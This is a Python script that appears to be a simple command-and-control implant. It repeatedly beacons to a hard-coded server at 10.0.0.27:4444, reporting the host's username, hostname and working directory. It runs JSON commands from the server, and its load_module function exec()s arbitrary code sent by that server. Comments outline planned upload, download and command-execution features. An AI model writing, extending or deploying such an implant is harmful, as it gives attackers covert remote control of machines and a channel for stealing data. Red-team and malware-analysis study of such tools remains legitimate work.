#!/usr/bin/env python
import requests
import time
import os
import getpass
import socket

requests.packages.urllib3.disable_warnings()

SETTINGS={
"urls":["https://10.0.0.27:4444/index.php?id=1"],
"attempts":3,
"beacon":10,
"debug":True
}

MODULES={}

def print_debug(e):
    if SETTINGS["debug"]:
        print(e)

def gen_urls():
    i=0
    while True:
        if i < len(SETTINGS["urls"]):
            yield SETTINGS["urls"][i]
            i=i+1
        else:
            i = 0

def send_msg(m=None, *args):
    print("send_msg({}, {})".format(m, args))
    i = 0
    if "url" not in SETTINGS:
        MODULES["gen_urls"] = gen_urls()
        SETTINGS["url"] = next(MODULES["gen_urls"])

    while i < SETTINGS["attempts"]:
        try:

            if args:
                m = {m:str(*args)}

            if m:
                print_debug("Sending: {}".format(m))
                r = requests.post(SETTINGS["url"], data=m, verify=False)
            else:
                r = requests.get(SETTINGS["url"], verify=False)

            print_debug(r.status_code)
            print_debug(r.text)

            return r

        except Exception as e:
            print_debug(e)
        i = i + 1

    SETTINGS["url"] = next(MODULES["gen_urls"]) 
#
#with open(filename, 'wb') as fd:
#    for chunk in r.iter_content(chunk_size=128):
#        fd.write(chunk)    

#def load_modules(d):
#    MODULES.update({k:eval(v)} for k,v in d.items())

def load_module(m, code):
    print_debug("Loading {}".format(m))
    print_debug("Code {}".format(code))
    g = globals().copy()
    exec(code, g)
    for name, func in g.items():
        if not name in globals():
            print("Module {} Loaded".format(name))
            MODULES[name] = func

def invoke_module(m, args=()):
    MODULES[m](*args)

def set(k, v):
    SETTINGS[k] = v

def do(cmd, args=()):
    print_debug("Doing {} ({})".format(cmd, args))

    if not isinstance(args, tuple) and not isinstance(args, list):
        args = (args,)

    print(args)

    if cmd in MODULES: 
        return invoke_module(cmd, args)
    elif cmd in globals():
        return globals()[cmd](*args)
    else:
        print_debug("{} not found!".format(cmd))

#dowload / upload / exec in background / exec and capture output / beacon

def get_cmd(r):
    cmd={}
    try:
        cmd=r.json()
        for k,v in cmd.items():
           do(k, v) 
        return True
    except Exception as e:
        # no work to do
        print("CMD: {} has no work".format(cmd))
        print(e)

def get_target_info():
    return {
        "usr":getpass.getuser(),
        "hostname":socket.gethostname(),
        "cwd": os.getcwd(),
        "time": time.time()
    }

def get_beacon():
    b = get_target_info()
    b["beacon"] = True
    return b

def main():
    while True:
        try:

            payload = do("get_beacon")

            res = do("send_msg", (payload,))
            if get_cmd(res):
                print_debug("Checking for additional commands...")
                continue

            print_debug("Sleeping {} seconds".format(SETTINGS["beacon"]))

            try:
                time.sleep(float(SETTINGS["beacon"]))
            except Exception as e:
                print_debug(e)
                time.sleep(15)
        except Exception as e:
            print_debug(e)
if __name__=="__main__":
    main()

